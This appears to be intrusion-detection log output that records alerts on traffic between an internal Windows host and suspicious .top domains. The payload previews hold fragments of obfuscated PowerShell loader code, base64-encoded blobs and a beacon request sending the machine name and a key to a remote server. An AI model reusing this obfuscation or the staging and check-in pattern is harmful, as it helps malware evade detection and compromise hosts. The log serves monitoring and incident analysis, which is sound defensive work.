=== Logs cleared at 2026-01-25 19:41:50.721381 ===


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:07.710039
Signature(s): powershell_command, malicious_domain, suspicious_user_agent
Threat Score: 10

Packet Info:
  Source: 10.2.21.101:64066
  Destination: 49.13.65.235:80
  Protocol: TCP
  Payload Size: 163 bytes

Payload Preview:
GET /f15.svg HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.19041.4046
Host: pbvzje4.top
Connection: Keep-Alive


==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:07.718183
Signature(s): powershell_command, base64_payload
Threat Score: 5

Packet Info:
  Source: 49.13.65.235:80
  Destination: 10.2.21.101:64066
  Protocol: TCP
  Payload Size: 898 bytes

Payload Preview:
h237j9az.Close()
		$1fj03z87eyai4cr.Close()
		[byte[]] $hk5brsviy17jzua = $bmz5qsjrg1eh3vp.ToArray()
 $aguwdbxnq36z7o1=$hk5brsviy17jzua
    return $aguwdbxnq36z7o1
}

[System.Text.Encoding]::ascii.GetString((bav6ycqel0nur98z7g41siod3kp "K75ueG1ha2hmMc4ndVr9SHXcPKIdyW3ivvIGTtzseqLP4w2eVbIP8lWxrwEKaCvCA3/AhZqwA96r3YCTxsEHRxK+EKdOX3XkY9zcr6TIhN4wGFsGt9mzOdtMTx2dlYOFHLLCFvY7Khc0ge9F73a7L2nSk0dA6UESJQRun3v4cQ08uAf9EIbugoZpmLnOJNR9Fx3xm+2YZE1qXC1emNQYYoiAmjEMBCcVJITUVelvihZpiVMArLqkzDGF1UB6Nida
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:07.720004
Signature(s): malicious_domain
Threat Score: 3

Packet Info:
  Source: 10.2.21.101:64067
  Destination: 167.71.107.109:80
  Protocol: TCP
  Payload Size: 92 bytes

Payload Preview:
GET /b%20jzioh%20h.php?s=515 HTTP/1.1
Host: bjlkchhaaigceke.top
Connection: Keep-Alive


==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:07.724518
Signature(s): powershell_command
Threat Score: 4

Packet Info:
  Source: 167.71.107.109:80
  Destination: 10.2.21.101:64067
  Protocol: TCP
  Payload Size: 1376 bytes

Payload Preview:
))))),(260344/4649),(401600/8032),(-4411+(7554-3087)))| ForEach-Object { [char]$_ }));$ontionbeisreeredesenonenatanarataral = ([cHAR[]]@((7977-(13451-5523)),(10291-10242),(247005/(4967046/1106)),(215169/(37755831/(3406+5543))),(110808/2052),(6776-(35609280/(10598-(9718366/1834)))),(-3840+(-4620+(5566+2942))),(259504/(46529994/(11811-(11689-(45657157/4603))))),(56376/(3655044/(2195127/627))),(-7256+7311),(453276/8394),(4100-4047),(37908/702),(9340-(3600+(9992472/(4755-2997)))),(-6705+6760),(16863
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:07.726530
Signature(s): powershell_command
Threat Score: 4

Packet Info:
  Source: 167.71.107.109:80
  Destination: 10.2.21.101:64067
  Protocol: TCP
  Payload Size: 1376 bytes

Payload Preview:
senonenatanarataral).((-jOiN (@((10291-(12469-(5947-(9065-5379)))),(3217-3100),(2812-2714),(1403-(-4482+5770)),(-3086+(31981576/9988)),(-3286+(10730-(67861140/(10856-1598)))),(6974-(5981+888)),(388-(1293-1015)),(717601/(19012943/2729)))| ForEach-Object { [char]$_ })))(($_ * (462/231)), (5451-(6467-(3311554/(6893107/(-913+3032)))))))});$eredtionalaralorinerreatbearbetionbeedar = -join ((74290/1955)..(-7663+7714) | ForEach-Object {[char][int]((-50+79) + ($inesaralarerbeonatesbeatedre + $ontionbeis
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:07.732648
Signature(s): powershell_command
Threat Score: 4

Packet Info:
  Source: 167.71.107.109:80
  Destination: 10.2.21.101:64067
  Protocol: TCP
  Payload Size: 1376 bytes

Payload Preview:
2000
4-709))),(-5878+5948),(549570/(8300-(10144-(31129044/(13417-9019))))),(-6213+(15047-8733)),(983124/9103),(530000/5300)) -join ''))($eredtionalaralorinerreatbearbetionbeedar, ([ChaR[]]@((8070-(44555400/5575)),(241314/(4189298/(1636+291))),(636020/(15565144/2692)),(792800/(34645360/3496)),(850707/7271),(930608/9496),(708588/6561),(-8867+(3789+(7869-(9587-(8787-1886))))),(-7877+7976),(5981-5937),(77190/(-7482+8412)),(513300/(3827+598)),(740692/7636),(-7918+8034),(-7762+7867),(-1184+(5681-(101
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:07.779607
Signature(s): powershell_command, base64_payload
Threat Score: 5

Packet Info:
  Source: 167.71.107.109:80
  Destination: 10.2.21.101:64067
  Protocol: TCP
  Payload Size: 1376 bytes

Payload Preview:
8sW98SN8VBHExfmWsHL4J7yzOG4UfAiw6kujc0DQyqzYRZjax3ux5hVd8bFcBLjeL7vZ1g3MtS8gw9pG0D24MFSyWjAINundqjXaPfxt8K80zsBFk5n/DzPgtd56amEbsowQAOurBR92AUE0Q0CH1XOVykRCULPWE76+xpEhDZ1JBIkMqBZUikU90e/vanpqp3i0NUqwPtcFbiQm1ZIM7BOj5ScOpZluVcyntTK3kxOPciD552NInL/t3pz3s9w8eS9qhtf0cUoFPF1UQISddiYC3DUolHcWdq2+uHwtppi8RQGumpmHnNPhYh5feu6anEWGFVnGpFy2iwURvTs4khf9+AMGZWrS6C9Y/YKJYEMTLd06MDIViTnOlASwU1w4Ry0+UxZjaUYvY0mAfGt9vj70G0iex031N4jAcn49SkJrxJ8BYKw8Lh7VJWn8EkwAyJoiGY2UPo+gHp8QaRqEOpsbY7/+mGeUF2o40HhPNW8RUK8CjMBY
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:07.783918
Signature(s): powershell_command, base64_payload
Threat Score: 5

Packet Info:
  Source: 167.71.107.109:80
  Destination: 10.2.21.101:64067
  Protocol: TCP
  Payload Size: 1376 bytes

Payload Preview:
a06BwGCict/zPUe6c3TddXxb1z9QAtK1qfwoPRPj4iGZi53mDqVrjbaSbafV6WJ9af9NUxCJg/emWVlGT5Qc+pBJ3dH/wngmB0ptgKfazbqUmGdnUEAXO1TsETKTjvPm/8IsG5rsLLFQJe0yK+7W/QE7r5Fouy4aPtZftioq/GBeq4djTQzhw5A0rHc0gxT8UwmHJ3xXCqZiwhcamjOz5dmd2EgFPEoRTNFFbjmkBeHSR4bOJ7l37dA5Nio5VoRQojPpbz0lw/+NTwOVwQbgkrJfZKmYpPkUODwjGreg8XAkQpqnKblg4qBApUZQ0gN5F2mxFwv+erd0NGcpnqU5LYLCxr87p4Hn3ZAjENFbSED6huEMVi0MLcdQiPgRglui6aIpgNJFWMeVcAft034TD2MLGKda7fuz4dNZ23XkK+K1yHI8enI42Jh44d2lJvI8+ycCCPvttnItFWDvfotY46LOh4Nz7gqdmjty/18ZuBJLppEx500x
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:07.789524
Signature(s): powershell_command, base64_payload
Threat Score: 5

Packet Info:
  Source: 167.71.107.109:80
  Destination: 10.2.21.101:64067
  Protocol: TCP
  Payload Size: 513 bytes

Payload Preview:
KNiThcO9ryNp3HZz1aOQaT1YUnsBFvSzPdUbKWaPXoNYblCmNVEKclm8zGNi3PN+RF17Pj4ehrSDmgJzXKkEKz2R8FTnORxqOOcBiBNI0RdPiPA/z93h3d/vxZ/T8lIPoyHOTU8RjZ4tuu5dopwUeJneN3K40Y+IPTfMWwC23huGm+KnFRyYDSGsTwwMyMalutnTzk0e3ZYVvmoMxgKxqN7hXa2POr9PFSamDcbGKG+1bjrywsnXy8urkRW1hAK/Zmiwb1OQk4KF9iq+bsiEh/RPFbDnxuosBsmu+PaffZedz46I/OHB9A7XhO0c7vu3FhnTCMVC9mUPrM6c98eKGA5V2MvUpLL/TJu+FG7UnD9jhqpORsaJrcCpqZmV9sCVsv2W9P52v65OgszGxOqVqP6HEYWpNuqM+tVSr4obG4f1viqchgmHmdOxh92sLUsP1mufgJp/lRie7iSBpipzLI9S3gHJPgoJwumSdv44ri7+OzVw"))|
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:07.791768
Signature(s): powershell_command, malicious_domain, suspicious_user_agent
Threat Score: 10

Packet Info:
  Source: 10.2.21.101:64067
  Destination: 167.71.107.109:80
  Protocol: TCP
  Payload Size: 198 bytes

Payload Preview:
GET /tx5lm7djyqhtr.php?id=DESKTOP-WIN10PC&key=74054124168&s=515 HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.19041.4046
Host: bjlkchhaaigceke.top


==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:07.793398
Signature(s): powershell_command
Threat Score: 4

Packet Info:
  Source: 167.71.107.109:80
  Destination: 10.2.21.101:64067
  Protocol: TCP
  Payload Size: 1376 bytes

Payload Preview:
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Wed, 21 Feb 2024 16:05:32 GMT
Content-Type: text/html; charset=UTF-8
Transfer-Encoding: chunked
Connection: keep-alive

1f6e
& (([system.String]::new(@((-4542+(-3609+8266)),(-2539+(-7078+9718)),(8555-(60482313/(-1305+8472))),(-3007+(21382312/(16809-(-273+10076)))),(-9359+(944+(43249472/(9338878/(2133918/1161))))),(-5735+(-3590+9433)),(-8852+(61794343/(17447571/2529))),(5206-(12311-(-2824+(19864-9838)))),(862040/(14221-(13825-(14161-7061
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:07.796958
Signature(s): powershell_command
Threat Score: 4

Packet Info:
  Source: 167.71.107.109:80
  Destination: 10.2.21.101:64067
  Protocol: TCP
  Payload Size: 1376 bytes

Payload Preview:
5-6490),(6717-(3545+3093)),(-9087+9185),(-4863+(13990-9021)),(1740-(9059-7420)),(156717/1583),(5525-(46717533/8637)))));& (([char[]]@((127650/(3549-(12231-(44210880/(37379685/8279))))),(5980-5879),(-7947+(14380-(10465-4148))),(401895/(18875-9944)),(-7259+(17345-(34042512/3408))),(-4424+4532),(10260-(-53+(7968+2240))),(-3120+(10828422/3366)),(6596-(-1515+7996))) -join '')) cfumnsti ([system.String]::new(@((-6157+6239),(-7955+8056),(828729/8371),(802142/7942),(-7065+7170),(-8240+8358),(-1665+1766)
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:07.798871
Signature(s): powershell_command
Threat Score: 4

Packet Info:
  Source: 167.71.107.109:80
  Destination: 10.2.21.101:64067
  Protocol: TCP
  Payload Size: 1376 bytes

Payload Preview:
2998-(5611+(8214-(6892314/1662)))))),(850500/(12362-4262)),(331740/3420),(7242-(12527-(-963+(52450209/(17827-9584)))))) -join '')) alrkcpijmh ([char[]]@((6606-6545)) -join '');& ((-join (@((-4545+4660),(212201/(9226-(5891+1234))),(243948/(7770-(51598035/9105))),(-4477+4522),(899966/9278),(-9993+(19482-9381)),(769755/7331),(-7933+8030),(-1118+(5506-4273)))| ForEach-Object { [char]$_ }))) xqgfvje ([char[]]@((109620/(-2978+(8575-(5458-(15065687/(-849+(9624-2678)))))))) -join '');& ((-join (@((7174-
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:07.801133
Signature(s): powershell_command
Threat Score: 4

Packet Info:
  Source: 167.71.107.109:80
  Destination: 10.2.21.101:64067
  Protocol: TCP
  Payload Size: 1376 bytes

Payload Preview:
7),(891880/8108),(344947/(11132-(-259+(9910-(5062280/2710))))),(-7742+7843),(6789-6675),(147809/1871),(-3347+3459),(-9348+(4804+4660)),(134190/1278),(936618/(79477522/9419)),(-2792+(15052674/(51081576/9848))))| ForEach-Object { [char]$_ }));& ((-join (@((798790/6946),(2932-2831),(5155-(11514115/(-3638+(26742345/4515)))),(369090/8202),(-8376+8473),(-5097+5205),(-9946+10051),(3947-(-2572+(-2147+8569))),(7546-7431))| ForEach-Object { [char]$_ }))) khfylmsxpobt ([system.String]::new(@((74115/1215)))
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:07.804215
Signature(s): powershell_command
Threat Score: 4

Packet Info:
  Source: 167.71.107.109:80
  Destination: 10.2.21.101:64067
  Protocol: TCP
  Payload Size: 1376 bytes

Payload Preview:
7)),(442736/(35118720/9360)),(-3730+3838),(6236-(5008+(7469300/6610))),(365040/3120),(-9710+(2308+(68243715/9081))),(-4334+(31165264/6994)),(9629-(44090956/4628)),(282596/(-7132+(5566+4232))),(1102068/9108),(9653-(81451517/(14884-(38684965/(649+5446))))),(269078/(6193-(8652-(12208-6975)))))| ForEach-Object { [char]$_ }));& ((-join (@((4132-(13127556/(27598260/8445))),(-4973+5074),(-4659+(9065-4290)),(-3585+(15235110/(-4053+(16261-8011)))),(-6092+(28060926/(5662966/1249))),(3966-3858),(466410/(-4
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:07.805948
Signature(s): powershell_command
Threat Score: 4

Packet Info:
  Source: 167.71.107.109:80
  Destination: 10.2.21.101:64067
  Protocol: TCP
  Payload Size: 1376 bytes

Payload Preview:
3-(36408960/(14701184/(-5656+(9857-1530)))))),(-2478+(7489090/(10672970/(576+3098)))),(4358-4247),(5705-5596))| ForEach-Object { [char]$_ }));& ((-join (@((382375/3325),(3169-(-3800+(21853976/(7018-(34968976/(14429-(10814-(13625-8124)))))))),(390920/3370),(396720/8816),(-4753+4850),(822096/(6252+1360)),(153300/1460),(-4198+(10792-6497)),(6357-(-3690+(59582068/(-2711+(37235250/4275))))))| ForEach-Object { [char]$_ }))) enxrflkih (-join (@((-5998+6107),(-3115+3218),(-9399+9501),(-2202+(10092-7783)
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:07.808242
Signature(s): powershell_command
Threat Score: 4

Packet Info:
  Source: 167.71.107.109:80
  Destination: 10.2.21.101:64067
  Protocol: TCP
  Payload Size: 1376 bytes

Payload Preview:
4-(42121411/6719)))| ForEach-Object { [char]$_ }))) reczdiomkvah ([char[]]@((546770/7811),(1050282/(29076726/(30358167/9879))),(3955-(19704330/(11352690/2213))),(392817/(9033-(11193-(5866+1987)))),(-4466+4563),(6704-(15455700/2340)),(7803-(6603+1096)),(6260-6215),(9746-9667),(-3936+(7317-(-3600+6883))),(-3265+3371),(337037/(-4747+8084)),(415107/4193),(-4697+4813)) -join '');& (([char[]]@((232300/(12831040/6352)),(-7241+(67069170/(78880725/(60030520/(-2647+9599))))),(8419-(13580-(8275-2998))),(-2
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:07.810805
Signature(s): powershell_command
Threat Score: 4

Packet Info:
  Source: 167.71.107.109:80
  Destination: 10.2.21.101:64067
  Protocol: TCP
  Payload Size: 1329 bytes

Payload Preview:
279-6793)),(3128-3014),(2848-(12867-(44599048/(6930-2509)))),(6757-6660),(658944/6656),(550368/(25570944/4832)),(-9822+9867),(316395/(-1940+5945)),(6912-(27371838/(13011-(66600570/7405)))),(-6453+(10032-3473)),(601859/5959),(277992/(3319056/1182)),(4079-3963))| ForEach-Object { [char]$_ }));& ((-join (@((9398-(3401+5882)),(443693/4393),(1692-1576),(283905/6309),(-4306+4403),(-9279+9387),(-9165+(13276-(-3119+(13431-(4510+(-5948+(74388864/9606))))))),(690155/(13986-(25347119/3689))),(258290/(4989-
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:07.812898
Signature(s): powershell_command
Threat Score: 4

Packet Info:
  Source: 167.71.107.109:80
  Destination: 10.2.21.101:64067
  Protocol: TCP
  Payload Size: 1376 bytes

Payload Preview:
1000
2)),(-1799+(-745+(-5415+8075))),(9257-9212),(482284/(-2218+(16236-(13064-4018)))),(-7298+(33615834/(5666-1127))),(263445/(15555800/6200)),(-1901+(19234746/9627)),(766705/6667)) -join '')) txksvfqgizacy ([char[]]@((-6817+(16047-9152)),(-3852+(10182-(9117-2888))),(-2760+(14777907/(45093405/(18096-9311)))),(88020/(-6073+(27852601/3469))),(3979-3900),(-1743+1841),(-8548+(1507+(10155-3008))),(4311-4210),(798138/(28878084/3582)),(773720/6670)) -join '');& (([char[]]@((5166-(-3679+(52406190/(1040
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:07.814987
Signature(s): powershell_command
Threat Score: 4

Packet Info:
  Source: 167.71.107.109:80
  Destination: 10.2.21.101:64067
  Protocol: TCP
  Payload Size: 1376 bytes

Payload Preview:
8425/5925),(-4833+(49598622/(6890+3136))),(223416/(10361-(37611665/(2701+(3414-(-7242+(16090-(-1764+(3925+5031))))))))),(3497-(-2961+(15442-9054))),(276222/2423),(484959/(8548-(-3218+(16033-(6121+(20474615/(43375248/(642+4686)))))))),(-4158+4267),(-8185+(2953+5277)),(353202/4773),(-2837+(6122-3170)),(2616-(-5925+(37665240/4468))),(-3590+(37566100/10153))) -join '');& (([char[]]@((-7640+(12302-(2179+(6121-3753)))),(-1865+1966),(-1277+1393),(202275/4495),(7964-(56288385/(3693+(31732692/9166)))),(7
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:07.816970
Signature(s): powershell_command
Threat Score: 4

Packet Info:
  Source: 167.71.107.109:80
  Destination: 10.2.21.101:64067
  Protocol: TCP
  Payload Size: 1376 bytes

Payload Preview:
0642-5045)))| ForEach-Object { [char]$_ }));& (([char[]]@((5599-5484),(192203/(-5386+7289)),(-6988+(12886656/1814)),(6144-6099),(7728-7631),(9721-(1444+8169)),(479640/(-822+(11102-5712))),(1454-(-5460+6817)),(725075/(632+5673))) -join '')) ebfrdvltm ([system.String]::new(@((-5896+(48795914/8179)),(-3829+(5693300/1445)),(604314/(23059350/(5806-(-3143+(1958+2641))))),(-2381+(6614-(-5693+(7699+(9685104/(38946864/(74257646/8557))))))),(1666-1569),(7138-7039),(-5821+5925),(83385/1853),(130508/(9507-7
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:07.819364
Signature(s): powershell_command
Threat Score: 4

Packet Info:
  Source: 167.71.107.109:80
  Destination: 10.2.21.101:64067
  Protocol: TCP
  Payload Size: 1376 bytes

Payload Preview:
),(122322/(-7249+(50022490/(3600+2390)))),(406182/3563),(-3065+3134),(944295/9735),(8443-(16614-(15910-7640))),(9642-9538),(-8536+8581),(-3013+3092),(4047-3949),(6335-6229),(-5149+(53560500/10202)),(2888-(15540308/5572)),(3281-(9039-(55538670/(-176+(52999393/(10597-5094)))))))| ForEach-Object { [char]$_ }));& (([char[]]@((-10090+(30880330/(7934172/(23477388/(61648290/6885))))),(-3152+(-245+(9323-5825))),(777548/6703),(275220/6116),(3503-(6575-(138+3031))),(9924-(18723-(38558403/(18103878/(-5964+
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:07.825871
Signature(s): powershell_command
Threat Score: 4

Packet Info:
  Source: 167.71.107.109:80
  Destination: 10.2.21.101:64067
  Protocol: TCP
  Payload Size: 1376 bytes

Payload Preview:
(17639-9733)),(346376/2986),(63810/1418),(550378/5674),(945324/(37856725/(-4137+(14762-6300)))),(2299-(-7356+(5971+(-6331+(379+(58529871/6141)))))),(503624/(6396544/(2524368/(5579-(1081+(-5769+(4044+4174))))))),(-5033+5148))))) gkpmzn ([char[]]@((2405-2335),(312021/(23564613/(13894-5511))),(-6899+(-1418+(11012-(-3974+6555)))),(3722-3653),(940221/9693),(403524/(26208680/(40316100/6270))),(6357-(11375-5122)),(-8306+8351),(-5795+(11895-(48444966/8046))),(-9437+(19607-10072)),(8513-(80101896/9528)),
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:07.830254
Signature(s): powershell_command
Threat Score: 4

Packet Info:
  Source: 167.71.107.109:80
  Destination: 10.2.21.101:64067
  Protocol: TCP
  Payload Size: 1376 bytes

Payload Preview:
ing]::new(@((709870/10141),(171606/(-5544+(3742+(9906732/2959)))),(-7418+(15639-(13207-5100))),(7691-(2014+5608)),(9132-9035),(-1812+1911),(997880/(18419-(69877256/(-620+8539)))),(157320/3496),(-7892+(1675+6296)),(822906/8397),(658472/6212),(8764-(286+(3855+(-4541+9063)))),(-5606+(14944-(-926+(20265-10100)))),(-1462+(15016248/9516)))));& (([system.String]::new(@((1171735/(93993525/9225)),(829513/(25197484/3068)),(2024-(6515-4607)),(-8064+8109),(7600-(13590-6087)),(8369-(2994+(48324725/9175))),(5
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:07.832880
Signature(s): powershell_command
Threat Score: 4

Packet Info:
  Source: 167.71.107.109:80
  Destination: 10.2.21.101:64067
  Protocol: TCP
  Payload Size: 1376 bytes

Payload Preview:
19-(13095-4187)),(6824-6725),(-7874+7975),(1474-(4375-(19003816/6301))),(-7526+(68432796/8956)))| ForEach-Object { [char]$_ }));& (([system.String]::new(@((-3536+3651),(1437-(-2936+4272)),(-9910+10026),(2278-(-5269+(14803-7301))),(952928/(48677920/4955)),(660960/6120),(244860/(13290068/(21228775/(-2582+(34852482/(847+4679)))))),(-1415+(7468-(13830-(5297+(17356095/(9578-(5401700/(3167-1267)))))))),(2492-2377))))) koixjnbdlqphwa ([char[]]@((336630/(6262-(-3262+(9435-(2772+1948))))),(8731-8620),(67
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:07.835994
Signature(s): powershell_command
Threat Score: 4

Packet Info:
  Source: 167.71.107.109:80
  Destination: 10.2.21.101:64067
  Protocol: TCP
  Payload Size: 1376 bytes

Payload Preview:
639-(-4313+(-1155+(39437024/4378)))),(10050-9934))));& ((-join (@((4553-4438),(-4920+(1607+(-6799+10213))),(290116/(7290-4789)),(4588-(8245545/(6929670/(-3147+(10765-(11055-7255)))))),(4111-4014),(-5669+5777),(2317-2212),(864561/8913),(768315/6681))| ForEach-Object { [char]$_ }))) yqdxnlkwz ([char[]]@((-8773+(10621-1734)),(630846/(255+5991)),(537588/(13794804/2797)),(8138-8027),(164138/(13364728/(2861+6747))),(-9367+9468),(3033-2988),(2675-(10321-7751)),(808520/6970),(-2354+2455),(338009/(-1112+
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:07.840231
Signature(s): powershell_command
Threat Score: 4

Packet Info:
  Source: 167.71.107.109:80
  Destination: 10.2.21.101:64067
  Protocol: TCP
  Payload Size: 1376 bytes

Payload Preview:
xagsfly (-join (@((2752-(-5917+8591)),(568226/(30661700/5450)),(-5911+(887+(3486+1657))),(-4982+(-2666+7693)),(6697-6618),(852208/8696),(3057-(4213-1262)),(-2787+(4979-2091)),(-3363+(-2709+6171)),(941572/8117))| ForEach-Object { [char]$_ }));& (([system.String]::new(@((-2181+2296),(111403/1103),(-10011+10127),(-6259+6304),(465891/4803),(-3249+3357),(590625/5625),(8059-(16226556/(9401294/(447+(13773-(19742385/2055)))))),(-1619+1734))))) hvfdqtuasyeon ([char[]]@((-4225+4303),(166044/(-1498+(507+26
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:07.844108
Signature(s): powershell_command
Threat Score: 4

Packet Info:
  Source: 167.71.107.109:80
  Destination: 10.2.21.101:64067
  Protocol: TCP
  Payload Size: 1376 bytes

Payload Preview:
-4471),(363465/(55497067/6871)),(-1863+(5997-4055)),(7947-(15952-(246+(-384+(10607-(3652-(-339+1625))))))),(379798/(11292-(-1385+9094))),(2433-(-6945+(2535+6742))),(-1621+(-2838+4558)),(-6511+(31286067/4721)))| ForEach-Object { [char]$_ }));& ((-join (@((-3000+3115),(-4649+(2937+(-5908+7721))),(-2233+(-5704+(-650+8703))),(319455/(63820010/(18232-(18003-(1988+(15332-8559)))))),(9785-(74306960/(14788-7118))),(2899-(-2619+5410)),(2740-(5317-2682)),(-4995+5092),(973245/8463))| ForEach-Object { [char
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:07.847674
Signature(s): powershell_command
Threat Score: 4

Packet Info:
  Source: 167.71.107.109:80
  Destination: 10.2.21.101:64067
  Protocol: TCP
  Payload Size: 1376 bytes

Payload Preview:
781-7683),(348634/3289),(8895-8794),(1241-(-8622+(5340+(1910+(10453212/4158))))),(-5971+6087)) -join '');& (([system.String]::new(@((-7781+7896),(5623-5522),(1140628/9833),(-5436+(-2713+(6577+(7482-5865)))),(9067-8970),(6272-(15654-9490)),(7228-7123),(-7123+(8588-(-4303+(13168062/(11691270/5035))))),(9846-9731))))) ewqsznbhamj ([char[]]@((1408-1338),(351537/(-3941+(13064-5956))),(9321-(7991+1216)),(126063/(6075-(23691096/5577))),(-3654+(7487-3736)),(817740/(71771140/(3988+4701))),(10195-10091),(
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:07.850412
Signature(s): powershell_command
Threat Score: 4

Packet Info:
  Source: 167.71.107.109:80
  Destination: 10.2.21.101:64067
  Protocol: TCP
  Payload Size: 1376 bytes

Payload Preview:
165482/1706),(9888-9780),(4287-4182),(-3574+(-3318+(583+(2667+(-3715+7454))))),(2422-(11605-9298)))))) hglotvpiq ([char[]]@((106120/(9991956/6591)),(586857/(-953+(-1177+7417))),(-5738+5852),(-10030+10099),(-8983+9080),(-7200+7299),(2132-(10889-(14194-5333))),(7284-(9563-2324)),(-9301+9380),(2525-(7191201/2963)),(222070/(9440070/(1932+2574))),(915868/9068),(142461/1439),(354264/(3496830/1145))) -join '');& (([system.String]::new(@((-1603+1718),(-10006+10107),(1351-(-8577+(17103-7291))),(-3989+403
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:07.853693
Signature(s): powershell_command
Threat Score: 4

Packet Info:
  Source: 167.71.107.109:80
  Destination: 10.2.21.101:64067
  Protocol: TCP
  Payload Size: 1376 bytes

Payload Preview:
8977-9759)))))))));& ((-join (@((9430-(15724-6409)),(-4044+4145),(5898-(44365286/7673)),(5410-(14128-(55084218/6286))),(203409/(-575+2672)),(-6427+6535),(-4496+4601),(-8508+8605),(-3640+(10683-6928)))| ForEach-Object { [char]$_ }))) czomlqjipd ([char[]]@((627550/(1596+(9756-(2902592/1216)))),(328005/(5635-(5000880/(8887-(10770-3749))))),(392160/(13345-9905)),(188991/(4424-1685)),(-5439+(-3344+(72247680/(14593-(37986531/(-2770+(3397+5256))))))),(-8179+8278),(-7919+8023),(-4795+(-363+5203)),(-1445
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:07.856251
Signature(s): powershell_command
Threat Score: 4

Packet Info:
  Source: 167.71.107.109:80
  Destination: 10.2.21.101:64067
  Protocol: TCP
  Payload Size: 1376 bytes

Payload Preview:
))),(622860/5932),(287702/2966),(2529-2414))| ForEach-Object { [char]$_ }))) sgezaljndmyrfo ([char[]]@((98280/(5838840/4634)),(853551/(17155-8704)),(255850/2150),(2107-2062),(8711-8600),(7254-(3738+(13397-9979))),(-4684+(3516+1274)),(-4284+4385),(995643/10057),(-7401+7517)) -join '');& (([char[]]@((8211-(2409+(4089+(-4791+(27792150/4350))))),(6593-6492),(-4848+4964),(-6961+7006),(6988-6891),(6057-(15671-9722)),(-5896+6001),(761935/7855),(8563-8448)) -join '')) hptwcoskzgx ([system.String]::new(@
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:07.859261
Signature(s): powershell_command
Threat Score: 4

Packet Info:
  Source: 167.71.107.109:80
  Destination: 10.2.21.101:64067
  Protocol: TCP
  Payload Size: 1376 bytes

Payload Preview:
104/7294),(2268-2223),(5982-5885),(886896/8212),(7687-(39418818/(17120307/(28744597/8729)))),(2467-(-1482+3852)),(349715/3041))))) mjrfhlb ([char[]]@((2457-2384),(-8379+8489),(-8521+8639),(-9865+9976),(-1639+(6047-(1765+2536))),(-4869+(-868+5838)),(8741-(63489496/(8797-1496))),(565472/(1110+(12296-6510))),(700132/(12396-5464)),(7299-7184),(4275-(6613-(12602-10148))),(-1568+1645),(476922/4722),(530352/4572),(9112-9008),(-2561+(23633840/(4260+(983+3602)))),(-2344+2444)) -join '');& ((-join (@((553
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:07.862923
Signature(s): powershell_command
Threat Score: 4

Packet Info:
  Source: 167.71.107.109:80
  Destination: 10.2.21.101:64067
  Protocol: TCP
  Payload Size: 1376 bytes

Payload Preview:
18635-10053))))))),(1431-(8571190/6430)),(-6135+(2374+3867)),(376023/3723),(-4608+4707),(1051656/9066))));& (([system.String]::new(@((5592-5477),(562570/(11897-(12407-6080))),(737296/6356),(292320/6496),(-8016+8113),(3921-3813),(-6001+6106),(2834-(4270-1533)),(-8264+8379))))) ieqjtaubco ([system.String]::new(@((671370/9591),(1072371/9661),(6667-(10869-(-4689+9005))),(692139/10031),(503139/(13429143/2589)),(4343-4244),(4507-4403),(-6850+6895),(4305-4226),(-8417+(12525565/(-716+2187))),(622962/(-3
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:07.866683
Signature(s): powershell_command
Threat Score: 4

Packet Info:
  Source: 167.71.107.109:80
  Destination: 10.2.21.101:64067
  Protocol: TCP
  Payload Size: 1376 bytes

Payload Preview:
